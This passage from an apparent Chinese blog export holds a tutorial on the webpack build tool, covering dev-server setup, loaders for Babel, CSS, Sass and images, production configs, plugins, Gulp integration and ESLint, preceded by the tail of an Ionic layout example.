class="badge"&gt;...&lt;/any&gt;&lt;/any&gt;...&lt;/any&gt; 示例代码1234567891011121314151617181920212223242526272829303132333435363738&lt;ion-view id="guidePage" view-title="引导页" cache-view="false"&gt; &lt;div class="bar bar-header calm-bg"&gt; &lt;h1 class="title"&gt;头部区域&lt;/h1&gt; &lt;/div&gt; &lt;div class="bar bar-subheader assertive-bg has-subheader"&gt; &lt;button class="button button-energized"&gt;会员登录&lt;/button&gt; &lt;button class="button balanced-bg"&gt;注册会员&lt;/button&gt; &lt;/div&gt; &lt;div class="bar bar-subheader positive-bg item-input-inset"&gt; &lt;a class="button button-clear icon-right ion-android-arrow-dropdown"&gt;北京&lt;/a&gt; &lt;label class="item-input-wrapper"&gt; &lt;input type="text" placeholder="输入查询信息"&gt; &lt;/label&gt; &lt;/div&gt; &lt;div class="scroll-content balanced-bg has-header has-subheader has-footer has-subfooter"&gt; &lt;div class="list"&gt; &lt;div class="item"&gt;列表1&lt;/div&gt; &lt;div class="item"&gt;列表2&lt;/div&gt; &lt;div class="item"&gt;列表3&lt;/div&gt; &lt;div class="item"&gt;列表4&lt;/div&gt; &lt;div class="item"&gt; &lt;button class="button icon ion-ios-cart royal-bg"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;购物车&amp;nbsp;&amp;nbsp;&lt;/button&gt; &lt;div class="badge badge-assertive"&gt;34&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="bar bar-subfooter royal-bg"&gt; &lt;div class="button-bar"&gt; &lt;button class="button button-energized"&gt;按钮1&lt;/button&gt; &lt;button class="button button-energized"&gt;按钮2&lt;/button&gt; &lt;button class="button balanced-bg"&gt;按钮3&lt;/button&gt; &lt;button class="button balanced-bg"&gt;按钮4&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="bar bar-footer dark-bg"&gt; &lt;button class="button button-light icon ion-bug"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;bug&amp;nbsp;&amp;nbsp;&lt;/button&gt; &lt;/div&gt;&lt;/ion-view&gt; 效果图]]></content>
      <categories>
        <category>Hybrid APP 开发系列</category>
      </categories>
      <tags>
        <tag>ionic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack 构建工具]]></title>
    <url>%2F2017%2F07%2F07%2Fwebpack%20%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[CommonJS 和 AMD 是用于 JavaScript 模块管理的两大规范，前者定义的是模块的同步加载，主要用于 NodeJS ；而后者则是异步加载，通过 RequireJS 等工具适用于前端。随着 npm 成为主流的 JavaScript 组件发布平台，越来越多的前端项目也依赖于 npm 上的项目，或者自身就会发布到 npm 平台。因此，让前端项目更方便的使用 npm 上的资源成为一大需求。 web 开发中常用到的静态资源主要有 JavaScript、CSS、图片、Jade 等文件，webpack 中将静态资源文件称之为模块。 webpack 是一个 module bundler (模块打包工具)，其可以兼容多种 js 书写规范，且可以处理模块间的依赖关系，具有更强大的 js 模块化的功能。Webpack 对它们进行统一的管理以及打包发布，其官方主页用下面这张图来说明 Webpack 的作用. webpack 介绍webpack 更 Gulp 的作用相同，是项目构建工具。 webpack 和 Gulp 的区别 Gulp 出现的比较早，更适合于做任务型的，可以处理任何的网站静态网站、SPA、Node.js 项目代码，Gulp 里面就是一堆的任务；Webpack 一般全部用来处理 SPA 应用，就 React、Vue.js、AngularJS 使用。 所以使用的场景不一样，因为内部的原理不同。 webpack 官网文档官网地址：http://webpack.github.io/docs/ webpack 的优势 对 CommonJS 、 AMD 、ES6 的语法做了兼容对 js、css、图片等资源文件都支持打包串联式模块加载器以及插件机制，让其具有更好的灵活性和扩展性，例如提供对 CoffeeScript、ES6的支持有独立的配置文件 webpack.config.js可以将代码切割成不同的 chunk，实现按需加载，降低了初始化时间支持 SourceUrls 和 SourceMaps，易于调试具有强大的 Plugin 接口，大多是内部插件，使用起来比较灵活webpack 使用异步 IO 并具有多级缓存。这使得 webpack 很快且在增量编译上更加快 webpack 的使用新建项目 在项目根目录下运行： 1$ npm init -y 搭建基本的项目结构如下图： src 中的开发文件，dist 是打包后的文件 安装123$ npm install webpack -g$ npm install webpack -save-dev$ npm install react -save 配置文件 webpack.develop.config.js 12345678910111213// webpack 的开发配置文件// 编写配置文件，要有最基本的文件入口和输出文件配置信息等// 里面还可以加loader和各种插件配置使用var path = require('path');module.exports = &#123; // 单页面 SPA 的入口文件 entry:path.resolve(__dirname,'src/js/app.js'), // 构建之后的文件输出位置配置 output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'bundle.js' &#125;&#125;; 运行1$ webpack --config webpack.develop.config.js 进行版本控制1234$ git init$ git status$ git add -A$ git commit -m &quot;项目目录结构及 webpack 初步配置&quot; webpack 启动过程演进把运行命令配置到 npm 的 script 中。 package.json 12345"scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "develop": "webpack --config webpack.develop.config.js", "publish": "webpack --config webpack.publish.config.js"&#125; 执行 ： 1$ npm run develop 更好的方式实现动启动如果需要一直输入 npm run develop 确实是一件非常无聊的事情，我们可以把让他安静的运行，让我们设置 webpack-dev-server 除了提供模块打包功能，Webpack 还提供了一个基于 Node.js Express 框架的开发服务器，它是一个静态资源 Web 服务器，对于简单静态页面或者仅依赖于独立服务的前端页面，都可以直接使用这个开发服务器进行开 发。在开发过程中，开发服务器会监听每一个文件的变化，进行实时打包，并且可以推送通知前端页面代码发生了变化，从而可以实现页面的自动刷新。 更好的方式实现自动启动：webpack 官方提供的一个第三个的插件，自动监听代码变化，帮我们重新构建，把 webpack 和 express 封装了 1$ npm install webpack-dev-server -save-dev 调整 npm 的 package.json scripts 部分中开发命令的配置 12345"scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "develop": "webpack-dev-server --config webpack.develop.config.js --devtool eval --progress --colors --hot --content-base src", "publish": "webpack --config webpack.publish.config.js"&#125; webpack-dev-server - 在 localhost:8080 建立一个 Web 服务器–devtool eval - 为你的代码创建源地址。当有任何报错的时候可以让你更加精确地定位到文件和行号–progress - 显示合并代码进度–colors – hot，命令行中显示颜色！–content-base 指向设置的输出目录//这点一定是我们的发布目录 在 src 下面，新建一个 index.html 文件， 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;webpack 使用&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src="bundle.js"&gt;&lt;/script&gt;&lt;/html&gt; 执行npm run develop ，结果如下图： 执行 npm run develop 之后我们发现执行没有结束，启动着监听，并在 8080 端口开启了一个服务器。 在浏览器中打开结果如下： 如果修改了 app.js 文件，会自动执行构建，刷新浏览器会发生变化。 在 index.html 访问的时候，会访问 bundle.js 文件，为什么，因为 webpack-dev-server 生成的 bundle 在内存中，放到内存中构建快 总的来说，当你运行 npm run develop 的时候，会启动一个 Web 服务器，然后监听文件修改，然后自动重新合并你的代码。真的非常简洁！ 注意: 用 webpack-dev-server 生成 bundle.js 文件是在内存中的，并没有实际生成如果引用的文件夹中已经有 bundle.js 就不会自动刷新了，你需要先把 bundle.js 文件手动删除用 webstorm 需要注意，因为他是自动保存的，所以可能识别的比较慢，你需要手动的 ctrl+s 一下 浏览器自动刷新修改 webpack.develop.config.js 的入口文件配置，修改 entry 部分如下： 123456789101112131415var path = require('path');module.exports = &#123; // 单页面 SPA 的入口文件 entry:[ // 实现浏览器自动刷新 'webpack/hot/dev-server', 'webpack-dev-server/client?http://localhost:8080', path.resolve(__dirname,'src/js/app.js') ], // 构建之后的文件输出位置配置 output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'bundle.js' &#125;&#125;; 修改了配置文件，重新启动，执行 npm run develop 结果如下图： 终端执行结果如下图： 此时的目录结构如下图： 常用加载器Loader：这是webpack准备的一些预处理工具 在构建项目之前做一些预处理操作，比如 ES6 转 ES5，Sass、Less 编译 JSX 和 ES6 到 ES5 语法的加载器安装： 12$ npm install babel-loader --save-dev$ npm install babel-core babel-preset-es2015 babel-preset-react --save-dev babel-loader: 转换器，编译 JSX 语法和 ES6 语法到 ES5 语法。 修改开发配置环境: webpack.develop.config.js 1234567891011module: &#123; loaders: [ &#123; test: /\.jsx?$/, // 用正则来匹配文件路径，这段意思是匹配 js 或者 jsx loader: 'babel', // 加载模块 "babel" 是 "babel-loader" 的缩写 query: &#123; presets: ['es2015', 'react'] &#125; &#125; ]&#125; 一个 React Hello, World! app.js 文件 123456789// 项目入口文件import React, &#123;Component&#125; from 'react';import ReactDOM from 'react-dom';ReactDOM.render( &lt;div&gt; Hello World! &lt;/div&gt;, document.getElementById('app')); 加载 CSSwebpack 允许像加载任何代码一样加载 CSS。可以选择需要的方式，但是可以为每个组件把所有的 CSS 加载到入口主文件中来做任何事情。 加载 CSS 需要 css-loader 和 style-loader，他们做两件不同的事情: css-loader 会遍历 CSS 文件，然后找到 url() 表达式然后处理他们style-loader 会把原来的 CSS 代码插入页面中的一个 style 标签中 安装1$ npm install css-loader style-loader --save-dev 新建文件夹：components 新增：_base.css Hello.css Hello.js Hello.sass 文件 修改配置文件：12345// 可以在 js 中引用 css 的加载器&#123; test: /\.css$/, loader: 'style!css' // 如果同时使用多个加载器，中间用 ! 连接，加载器的执行顺序是从右向左&#125; ！用来定义loader的串联关系，”-loader”是可以省略不写的，多个loader之间用“!”连接起来 Css加载策略1、在主入口文件中，比如 src/app.js 你可以为整个项目加载所有的 CSS 1import './project-styles.css'; CSS 就完全包含在合并的应用中，再也不需要重新下载。 2、懒加载（推荐） 如果想发挥应用中多重入口文件的优势，可以在每个入口点包含各自的 CSS。 把模块用文件夹分离，每个文件夹有各自的 CSS 和 JavaScript 文件。再次，当应用发布的时候，导入的 CSS 已经加载到每个入口文件中。 3、定制组件css 可以根据这个策略为每个组件创建 CSS 文件，可以让组件名和 CSS 中的 class 使用一个命名空间，来避免一个组件中的一些 class 干扰到另外一些组件的 class。如下图： 4、使用内联样式取代 CSS 文件 在 “React Native” 中不再需要使用任何 CSS 文件，只需要使用 style 属性，可以把你的 CSS 定义成一个对象，那样就可以根据项目重新来考略你的 CSS 策略。 加载sass下载依赖 1$ npm install sass-loader -save-dev 修改配置文件 12345// 可以在 js 中引用 sass 的加载器&#123; test: /\.scss$/, loader: 'style!css!sass'&#125; 安装sass-loader之后运行运行 npm run develop 时报错如下： 解决： 1$ npm install node-sass -save-dev 图片处理 直到 HTTP/2 才能在应用加载的时候避免设置太多 HTTP 请求。根据浏览器不同必须设置并行请求数，如果在 CSS 中加载了太多图片的话，可以自动把这些图片转成 BASE64 字符串然后内联到 CSS 里来降低必要的请求数，这个方法取决于图片大小。需要为应用平衡下载的大小和下载的数量，不过 Webpack 可以让这个平衡十分轻松适应。 下载载依赖 1$ npm install url-loader file-loader --save-dev 修改配置文件: 123456789&#123; test: /\.(png|jpg|gif|jpeg)$/, loader: 'url?limit=25000'&#125;,// 处理字体&#123; test: /\.(eot|woff|ttf|woff2|svg)$/, loader: 'url?limit=25000'&#125; 加载器会把需要转换的路径变成 BASE64 字符串，在其他的 webpack 书中提到的这方面会把 CSS 中的 “url()” 像其他 require 或者 import 来处理。意味着如果我们可以通过它来处理我们的图片文件。url-loader 传入的 limit 参数是告诉它图片如果不大于 25KB 的话要自动在它从属的 css 文件中转成 BASE64 字符串。 大图片处理 在代码中是一下情况： 1234567div.img &#123; background: url(../image/xxx.jpg)&#125;//或者var img = document.createElement("img");img.src = require("../image/xxx.jpg");document.body.appendChild(img); 1234567// 可以这样配置module: &#123; &#123; test: /\.(png|jpg)$/, loader: 'url-loader?limit=10000&amp;name=build/[name].[ext]' &#125;]&#125; 针对上面的两种使用方式，loader 可以自动识别并处理。根据 loader 中的设置，webpack 会将小于指点大小的文件转化成 base64 格式的 dataUrl，其他图片会做适当的压缩并存放在指定目录中。 这一步的目录如下： components/Hello.js12345678910111213141516171819import './Hello.css';import './Hello.scss';import React, &#123;Component&#125; from 'react';// 直接在js中定义样式，内嵌样式let style = &#123; backgroundColor: 'blue'&#125;;export default class Hello extends Component &#123; render() &#123; return ( &lt;div&gt; &#123;/*内嵌样式的写法*/&#125; &lt;h1 style=&#123;style&#125; onClick=&#123;()=&gt;this.myClick("fdfdf",23)&#125;&gt;使用样式演示&lt;/h1&gt; &lt;br/&gt; &lt;img/&gt; &lt;/div&gt; ) &#125;&#125; components/_base.scss123// 新定义了一个变量$fontSize: 100px;components/Hello.css 12345678910h1 &#123; color: red;&#125;img&#123; height: 200px; width: 200px; background-image: url("../images/mv.png"); -moz-background-image: url("../images/mv.png"); background-size: cover;&#125; components/Hello.scss1234@import "base";h1&#123; // 利用静默注释描述一个样式 这种注释内容不会出现在生成的css文件中 font-size: $fontSize; /* _base.sass是部分文件，不会生成单独的css 这种注释内容会出现在生成的css文件中 */&#125; 最终的 webpack.develop.config.js 文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980// webpack 的开发配置文件// 编写配置文件，要有最基本的文件入口和输出文件配置信息等// 里面还可以加loader和各种插件配置使用var path = require('path');// 自动打开浏览器插件var OpenBrowserPlugin = require('open-browser-webpack-plugin');module.exports = &#123; // 单页面 SPA 的入口文件 entry:[ // 实现浏览器自动刷新 'webpack/hot/dev-server', 'webpack-dev-server/client?http://localhost:8080', path.resolve(__dirname,'src/js/app.js') ], // 构建之后的文件输出位置配置 output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'bundle.js' &#125;, module: &#123; // 不要轻易使用 noParse // noParse: [/moment-with-locales/], // preLoaders: [ // &#123; test: /\.js$/, loader: "eslint-loader", exclude: /node_modules/ &#125; // ], loaders: [ // JXS 和 ES6 语法转换为 ES5 &#123; test: /\.jsx?$/, // 用正则来匹配文件路径，这段意思是匹配 js 或者 jsx loader: 'babel', // 加载模块 "babel" 是 "babel-loader" 的缩写 query: &#123; presets: ['es2015', 'react', 'stage-0', 'stage-1', 'stage-2', 'stage-3'] &#125; &#125;, // 可以在 js 中引用 css 的加载器 &#123; test: /\.css$/, loader: 'style!css' // 如果同时使用多个加载器，中间用 ! 连接，加载器的执行顺序是从右向左 &#125;, // 可以在 js 中引用 sass 的加载器 &#123; test: /\.scss$/, loader: 'style!css!sass' &#125;, // 处理图片 &#123; test: /\.(png|jpg|gif|jpeg)$/, loader: 'url?limit=25000' &#125;, // 处理字体 &#123; test: /\.(eot|woff|ttf|woff2|svg)$/, loader: 'url?limit=1000000' &#125; ] &#125;, resolve: &#123; //查找module的话从这里开始查找 // root: '/pomy/github/flux-example/src', //绝对路径 //自动扩展文件后缀名，意味着我们require模块可以省略不写后缀名 //注意一下, extensions 第一个是空字符串! 对应不需要后缀的情况. extensions: ['', '.js', '.json', '.sass', 'jsx'], //模块别名定义，方便后续直接引用别名，无须多写长长的地址 alias: &#123; // AppStore : 'js/stores/AppStores.js', //后续直接 require('AppStore') 即可 // ActionType : 'js/actions/ActionType.js', // AppAction : 'js/actions/AppAction.js' &#125; &#125;, // 配置了这个属性之后 react 和 react-dom 这些第三方的包都不会被构建进 js 中，那么我们就需要通过 cdn 进行文件的引用了 // 前边的这个名称是在项目中引用用的，相当于 import React from 'react1' 中的 react externals: &#123; // 'react1': 'react', // 'react-dom1': 'react-dom', // '$1': 'jQuery' &#125;, plugins: [ new OpenBrowserPlugin(&#123;url: 'http://localhost:8080/', browser: 'chrome'&#125;) ]&#125;; webpack 的部署策略修改 npm 的 package.json 文件“publish”: “ webpack –config webpack.publish.config.js -p”, 指向生产的配置文件，并且加上了webpack的cli的-p,他会自动做一些优化 分离应用和第三方何时应该分离？ 当应用依赖其他库尤其是像 React JS 这种大型库的时候，需要考虑把这些依赖分离出去，这样就能够让用户在更新应用之后不需要再次下载第三方文件。 当满足下面几个情况的时候你就需要这么做了： 1、当你的第三方的体积达到整个应用的 20% 或者更高的时候。2、更新应用的时候只会更新很小的一部分3、你没有那么关注初始加载时间，不过关注优化那些回访用户在你更新应用之后的体验。4、有手机用户。 修改 webpack.publish.config.js 文件 1234567891011121314151617181920212223var path = require('path');var node_modules = path.resolve(__dirname, 'node_modules');module.exports = &#123; entry: path.resolve(__dirname,'src/js/app.js'), output: &#123; path: path.resolve(__dirname, 'build'), filename: 'bundle.js', &#125;, // ... plugins: [ new CleanPlugin(['dist']), // 分离第三方应用插件,name属性会自动指向entry中vendros属性，filename属性中的文件会自动构建到output中的path属性下面 new webpack.optimize.CommonsChunkPlugin(&#123;name: 'vendors', filename: 'vendors.js'&#125;), // 可以新建多个抽离样式的文件，这样就可以有多个css文件了。 new ExtractTextPlugin("app.css"), new webpack.DefinePlugin(&#123; //去掉react中的警告，react会自己判断 'process.env': &#123; NODE_ENV: '"production"' &#125; &#125;) ]&#125; 可以看到，其实生产环境的配置和开发的配置没有太大的不同，主要是把不需要的东西给去掉了 1$ npm run publish 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;webpack 使用&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt;&lt;/div&gt;&lt;/body&gt;&lt;script src="bundle.js"&gt;&lt;/script&gt;&lt;script src="vendors.js"&gt;&lt;/script&gt;&lt;/html&gt; 注意：记住要把这些文件都加入到你的 HTML 代码中，但在上面这种引入后，在浏览器打开之后报下面这个错误，是因为引入顺序的问题 将上面 index.html 文件中的两个 js 文件引入顺序调换，如下 12345&lt;!DOCTYPE html&gt;&lt;!-- ... --&gt;&lt;script src="vendors.js"&gt;&lt;/script&gt;&lt;script src="bundle.js"&gt;&lt;/script&gt;&lt;/html&gt; 和 gulp 的集成12345678910111213141516171819202122232425262728293031323334353637// gulp 的任务是控制执行流程，webpack 的任务是处理复杂引用的依赖var gulp = require('gulp');// 删除文件和目录var del = require('del');// 按顺序执行var gulpSequence = require('gulp-sequence');// 引入webpack的本地模块var webpack = require("webpack");// 引入wbpack的配置文件var webpackConfig = require("./webpack.publish.config.js");gulp.task('default', ['sequence'], function() &#123; console.log("项目构建成功");&#125;);// 流程控制gulp.task('sequence', gulpSequence('clean','webpack'));// 删除文件和文件夹gulp.task('clean', function(cb) &#123; //del('dist);// 如果直接给dist的目录，项目启动的顺序还有清除结果会报错，所以要写的更详细一些 del(['dist/js','dist/css','dist/img','dist/*.html']); setTimeout(function()&#123; return cb(); &#125;,3000)&#125;);//写一个任务，在gulp中执行webpack的构建// gulp 负责任务流程部分的操作，webpack 负责复杂模块系统的引用分离工作gulp.task('webpack', function(cb) &#123; setTimeout(function()&#123; // 执行webpack的构建任务 webpack(webpackConfig, function (err, stats) &#123; if (err)&#123; console.log("构建任务失败"); &#125;else&#123; cb(); &#125; &#125;); &#125;,3000)&#125;); 合并成单文件一般情况下只有在下面的情况下才使用单入口模式： 1、应用很小2、很少会更新应用3、你不太关心初始加载时间 gulp + webpack 构建多页面前端项目 http://cnodejs.org/topic/56df76559386fbf86ddd6916 常用插件压缩插件 webpack.optimize.UglifyJsPlugin, 这个插件是webpack自带的.在配置文件中加入以下代码： 1234567plugins: [ new webpack.optimize.UglifyJsPlugin(&#123; compress: &#123; warnings: false &#125; &#125;)] 提取css插件在 webpack 中编写 js 文件时，可以通过 require 的方式引入其他的静态资源，可通过 loade r对文件自动解析并打包文件。通常会将 js 文件打包合并，css文件会在页面的header中嵌入style的方式载入页面。但开发过程中我们并不想将样式打在脚本中，最好可以独立生成css文 件，以外链的形式加载。这时extract-text-webpack-plugin插件可以帮我们达到想要的效果。需要使用npm的方式加载插件，然后 参见下面的配置，就可以将js中的css文件提取，并以指定的文件名来进行加载。 1$ npm install extract-text-webpack-plugin --save-dev 只能把 css 抽出来，但是 sass 的样式不能分离出来。 1234var ExtractTextPlugin = require("extract-text-webpack-plugin");plugins: [ new ExtractTextPlugin("app.css")] 自动创建 index.Html 页面插件html-webpack-plugin 123456789101112131415161718var HtmlWebpackPlugin = require('html-webpack-plugin');plugins: [ new HtmlWebpackPlugin(&#123; template: './src/template.html', htmlWebpackPlugin: &#123; "files": &#123; "css": ["app.css"], "js": ["vendors.js", "bundle.js"] &#125; &#125;, // 压缩 html 文档 minify: &#123; removeComments: true, collapseWhitespace: true, removeAttributeQuotes: true &#125; &#125;)] 优化第三方包12345678plugins: [ new webpack.DefinePlugin(&#123; //去掉react中的警告，react会自己判断 'process.env': &#123; NODE_ENV: '"production"' &#125; &#125;)] 自动打开浏览器插件open-browser-webpack-plugin https://github.com/baldore/open-browser-webpack- webpack.develop.config.js 12345// 自动打开浏览器插件var OpenBrowserPlugin = require('open-browser-webpack-plugin');plugins: [ new OpenBrowserPlugin(&#123;url: 'http://localhost:8080/', browser: 'chrome'&#125;)] 提取 js 公共部分插件提取公共文件: CommonsChunkPlugin 1234plugins: [ // 分离第三方应用插件,name属性会自动指向 entry 中 vendros 属性，filename 属性中的文件会自动构建到 output 中的 path 属性下面 new webpack.optimize.CommonsChunkPlugin(&#123;name: 'vendors', filename: 'vendors.js'&#125;),] ProvidePlugin插件自动添加引用插件，全局暴露插件，直接使用 删除目录插件clean-webpack-plugin 1234var CleanPlugin = require("clean-webpack-plugin");plugins: [ new CleanPlugin(['dist']),] 拷贝文件插件copy-webpack-plugin 合并配置文件插件 webpack-config https://github.com/mdreizin/webpack-config 最终的 webpack.publish.config.js 文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104// webpack 的发布配置文件var path = require('path');var webpack = require('webpack');// 自动生成index.html页面插件var HtmlWebpackPlugin = require('html-webpack-plugin');// 提取css文件的插件var ExtractTextPlugin = require("extract-text-webpack-plugin");// 删除文件夹var CleanPlugin = require('clean-webpack-plugin');module.exports = &#123; // 单页面 SPA 的入口文件 entry: &#123; app: path.resolve(__dirname,'src/js/app.js'), // 当 react 作为一个 node 模块安装的时候， // 可以直接指向它，就比如 require('react'); vendors: ['react', 'react-dom'] &#125;, // 构建之后的文件输出位置配置 output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'bundle.js' &#125;, module: &#123; loaders: [ // JXS 和 ES6 语法转换为 ES5 &#123; test: /\.jsx?$/, // 用正则来匹配文件路径，这段意思是匹配 js 或者 jsx loader: 'babel', // 加载模块 "babel" 是 "babel-loader" 的缩写 query: &#123; presets: ['es2015', 'react', 'stage-0', 'stage-1', 'stage-2', 'stage-3'] &#125; &#125;, // 可以在 js 中引用 css 的加载器 &#123; test: /\.css$/, loader: ExtractTextPlugin.extract("style-loader", "css-loader") // 如果同时使用多个加载器，中间用 ! 连接，加载器的执行顺序是从右向左 &#125;, // 可以在 js 中引用 sass 的加载器 &#123; test: /\.scss$/, loader: ExtractTextPlugin.extract("style-loader", "css-loader!sass-loader") &#125;, // 处理图片 &#123; test: /\.(png|jpg|gif|jpeg)$/, loader: 'url?limit=25000&amp;name=images/[name].[ext]' &#125;, // 处理字体 &#123; test: /\.(eot|woff|ttf|woff2|svg)$/, loader: 'url?limit=1000000&amp;name=fonts/[name],[ext]' &#125; ] &#125;, resolve: &#123; //查找module的话从这里开始查找 // root: '/pomy/github/flux-example/src', //绝对路径 //自动扩展文件后缀名，意味着我们 require 模块可以省略不写后缀名 //注意一下, extensions 第一个是空字符串! 对应不需要后缀的情况. extensions: ['', '.js', '.json', '.sass', 'jsx'], //模块别名定义，方便后续直接引用别名，无须多写长长的地址 // alias: &#123; // AppStore : 'js/stores/AppStores.js',//后续直接 require('AppStore') 即可 // ActionType : 'js/actions/ActionType.js', // AppAction : 'js/actions/AppAction.js' // &#125; &#125;, plugins: [ // 使用了该插件就不适用 gulp 了 new CleanPlugin(['dist']), // 分离第三方应用插件,name属性会自动指向 entry 中 vendros 属性，filename 属性中的文件会自动构建到output中的path属性下面 new webpack.optimize.CommonsChunkPlugin(&#123;name: 'vendors', filename: 'vendors.js'&#125;), // 用webpack压缩代码，可以忽略代码中的警告 new webpack.optimize.UglifyJsPlugin(&#123; compress: &#123; warnings: false &#125; &#125;), // 可以新建多个抽离样式的文件，这样就可以有多个css文件了。 new ExtractTextPlugin("app.css"), new HtmlWebpackPlugin(&#123; template: './src/template.html', htmlWebpackPlugin: &#123; "files": &#123; "css": ["app.css"], "js": ["vendors.js", "bundle.js"] &#125; &#125;, // 压缩 html 文档 minify: &#123; removeComments: true, collapseWhitespace: true, removeAttributeQuotes: true &#125; &#125;), // 优化第三方的包，减少代码量 new webpack.DefinePlugin(&#123; //去掉react中的警告，react会自己判断 'process.env': &#123; NODE_ENV: '"production"' &#125; &#125;) ]&#125;; 最终的目录结构如下图： 开发阶段代码风格控制 eslint安装： 12$ npm install eslint -g$ npm install eslint-loader -save-dev 12345module : &#123; preLoaders: [ &#123;test: /\.js$/, loader: "eslint-loader", exclude: /node_modules/&#125; ],&#125; .eslintrc.js 文件 123456789101112131415161718192021222324252627282930313233343536373839module.exports = &#123; // 开启推荐配置信息 // "extends": "eslint:recommended", // 默认情况下，ESLint 会在所有父级目录里寻找配置文件，一直到根目录。如果你想要你所有项目都遵循一个特定的约定时，这将会很有用，但有时候会导致意想不到的结果。为了将 ESLint 限制到一个特定的项目，在你项目根目录下的 package.json 文件或者 .eslintrc.* 文件里的 eslintConfig 字段下设置 "root": true。ESLint 一旦发现配置文件中有 "root": true，它就会停止在父级目录中寻找。 "root": true, // 脚本在执行期间访问的额外的全局变量 // 当访问未定义的变量时，no-undef 规则将发出警告。如果你想在一个文件里使用全局变量，推荐你定义这些全局变量，这样 ESLint 就不会发出警告了。你可以使用注释或在配置文件中定义全局变量。 "globals" : &#123; "window":true, "document":true, "$":true &#125;, // 设置插件 // "plugins": [ // 'html' // ], // 设置解析器选项 "parserOptions": &#123; "ecmaVersion": 6, "sourceType": "module", "ecmaFeatures": &#123; "jsx": true &#125; &#125;, // 启用的规则及各自的错误级别 "rules" : &#123; // 禁止用console "no-console":1, // 禁止用分号 "semi":[1,'never'], // 在同一个作用域中禁止多次重复定义 "no-redeclare":1 &#125;, // 指定想启用的环境 "env": &#123; "browser": true, "node": true &#125;&#125;; 其它知识点webpack中的非入口文件（异步加载）这个是重点要配合 chunkname 属性，react-router 的动态路由会用到 http://react-china.org/t/webpack-output-filename-output-chunkfilename/2256/2 基本上都是在 require.ensure 去加载模块的时候才会出现，chunkFileName，个人理解是 cmd 和 amd 异步加载而且没有给入口文件时，会生成了 no-name 的 chunk，所以 chunkFileName一般都会是 [id].[chunkhash].js, 也就是这种 chunk 的命名一般都会是 0.a5898fnub6.js. Resolve属性webpack 在构建包的时候会按目录的进行文件的查找，resolve 属性中的 extensions 数组中用于配置程序可以自行补全哪些文件后缀： 12345678910111213resolve: &#123; //查找module的话从这里开始查找 root: '/pomy/github/flux-example/src', //绝对路径 //自动扩展文件后缀名，意味着我们require模块可以省略不写后缀名 //注意一下, extensions 第一个是空字符串! 对应不需要后缀的情况. extensions: ['', '.js', '.json', '.scss',’jsx’], //模块别名定义，方便后续直接引用别名，无须多写长长的地址 alias: &#123; AppStore : 'js/stores/AppStores.js',//后续直接 require('AppStore') 即可 ActionType : 'js/actions/ActionType.js', AppAction : 'js/actions/AppAction.js' &#125;&#125; Externals属性外部依赖不需要打包进 bundle，当我们想在项目中 require 一些其他的类库或者 API ，而又不想让这些类库的源码被构建到运行时文件中，这在实际开发中很有必要。比如：在页面里通过 script 标签引用了 jQuery：&lt;script src=&quot;//code.jquery.com/jquery-1.12.0.min.js&quot;&gt;&lt;/script&gt;，所以并不想在其他 js 里再打包进入一遍，比如你的其他 js 代码类似： 其实就是不是通过require或者import引入的，而是直接写在html中的js地址。 1234567// 配置了这个属性之后 react 和 react-dom 这些第三方的包都不会被构建进 js 中，那么我们就需要通过 cdn 进行文件的引用了// 前边的这个名称是在项目中引用用的，相当于 import React from &apos;react1&apos; 中的 reactexternals: &#123; &apos;react1&apos;: &apos;react&apos;, &apos;react-dom1&apos;: &apos;react-dom&apos;, &apos;$1&apos;: &apos;jQuery&apos;&#125;, 这样用了 externals 属性时不用分离插件了，作用是这里引的插件不会被 webpack 所打包。要么用 cdn 要么需要 webpack 打包。下图为 webpack 中使用公用的 CDN: 开发环境中使用压缩文件http://fakefish.github.io/react-webpack-cookbook/Optimizing-rebundling.html 不使用就会把 react 再处理一遍 noParse属性module.noParse 是 webpack 的另一个很有用的配置项，如果确定一个模块中没有其他新的依赖项就可以配置这个像，webpack 将不再扫描这个文件中的依赖。 123module: &#123; noParse: [/moment-with-locales/]&#125; 多文件入口http://fakefish.github.io/react-webpack-cookbook/Multiple-entry-points.html 强制从新加载文件http://fakefish.github.io/react-webpack-cookbook/Optimizing-caching.html Chunk代码分离： http://webpack.github.io/docs/code-splitting.html 懒加载(1)、在 react 中如何使用 http://fakefish.github.io/react-webpack-cookbook/Lazy-loaded-entry-points.html (2)、在 react-router 中用到动态加载路由可以实现 在服务器端用 webpackNode 和webpack 集成用到的中间件：http://www.tuicool.com/articles/IvQb2eyNode 和webpack 集成过程中遇到的坑如何解决：http://www.tuicool.com/articles/zEZneuq 不推荐用 webpack 构建 Node 代码 热加载组件http://fakefish.github.io/react-webpack-cookbook/Hot-loading-components.html 最后的 package.json1234567891011121314151617181920212223242526272829303132333435363738&#123; "name": "webpack_example", "version": "1.0.0", "description": "CommonJS 和 AMD 是用于 JavaScript 模块管理的两大规范，前者定义的是模块的同步加载，主要用于 NodeJS ；而后者则是异步加载，通过 RequireJS 等工具适用于前端。随着 npm 成为主流的 JavaScript 组件发布平台，越来越多的前端项目也依赖于 npm 上的项目，或者自身就会发布到 npm 平台。因此，让前端项目更方便的使用 npm 上的资源成为一大需求。", "main": "index.js", "scripts": 